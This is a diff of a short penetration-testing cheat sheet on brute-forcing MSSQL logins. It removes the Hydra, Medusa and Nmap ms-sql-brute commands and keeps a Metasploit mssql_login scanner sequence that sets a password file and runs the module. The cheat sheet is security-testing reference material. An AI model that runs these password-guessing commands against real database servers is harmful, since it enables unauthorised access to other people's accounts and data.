@@ -1,14 +1,4 @@
-# MSSQL
-
-## 01 - Hydra
-
-`$ hydra -L users.lst –P passwords.lst <IP> mssql`
-
-## 02 - Medusa
-
-`$ medusa -h <IP> –U users.lst –P passwords.lst –M mssql`
-
-## 03 - Metasploit
+# Metasploit
 
 ```
 msf > use auxiliary/scanner/mssql/mssql_login
@@ -47,11 +37,3 @@ msf auxiliary(scanner/mssql/mssql_login) > set pass_file /path/to/passwords.lst
 
 msf auxiliary(scanner/mssql/mssql_login) > run -j
 ```
-
-## 04 - Nmap
-
-`$ nmap -p 1433 --script ms-sql-brute --script-args userdb=users.lst,passdb=passwords.lst <IP>`
-
-## References
-
-- [Password Cracking MSSQL](https://www.hackingarticles.in/password-crackingms-sql/)
